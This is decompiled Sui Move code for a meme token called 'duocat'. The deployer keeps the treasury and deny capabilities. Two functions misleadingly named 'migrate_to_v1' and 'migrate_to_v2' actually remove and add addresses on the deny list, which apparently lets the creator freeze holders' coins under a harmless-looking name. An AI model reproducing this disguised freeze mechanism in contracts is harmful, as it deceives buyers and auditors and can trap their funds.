module 0x71d0bfd8dd17a4c4514fc1a7510919febeec4ef8dae3e0a4d0021be92678ead4::duocat {
    struct DUOCAT has drop {
        dummy_field: bool,
    }

    fun init(arg0: DUOCAT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency<DUOCAT>(arg0, 6, b"DCS", b"duocat sui", b"Two cats sitting in front of a laptop. One of them is reaching out to the keyboard with its paw and seems active, while the other cat is watching with curiosity.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/QmSEvv6ktZfdWpKGGtzq5k88nFzfZFKKgFCpXwxALpGg1i?img-width=256&img-dpr=2")), arg1);
        let v3 = 0x2::tx_context::sender(arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<DUOCAT>>(v0, v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCap<DUOCAT>>(v1, v3);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DUOCAT>>(v2);
    }

    public fun migrate_to_v1(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCap<DUOCAT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_remove<DUOCAT>(arg0, arg1, arg2, arg3);
    }

    public fun migrate_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCap<DUOCAT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_add<DUOCAT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

